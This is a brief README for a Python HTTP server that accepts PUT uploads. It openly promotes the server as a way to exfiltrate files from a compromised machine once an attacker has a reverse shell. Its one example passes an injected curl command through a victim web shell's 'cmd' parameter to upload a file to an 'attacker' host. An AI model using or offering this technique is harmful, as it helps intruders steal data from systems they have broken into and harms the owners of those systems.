# SimpleHTTPServer_PUT
Pythons Module for Simple HTTP Server with *PUT*. 
</br>This is useful for exfiltration of data once you have access (rev shell) to a machine

</br> Useful for exfiltrating files from a compromised server.
</br> Once you have a reverse shell you can send files to the attacker computer. You can do this with curl and upload file to the HTTP server on kali;
Default SimpleHTTPServer in Python does not allow PUT request. Using this server that accepts PUT requests you can upload files with curl;

</br> **Example**
root@kali:# curl https://victim.php?cmd=curl+http://attacker+--upload-files+flat.txt
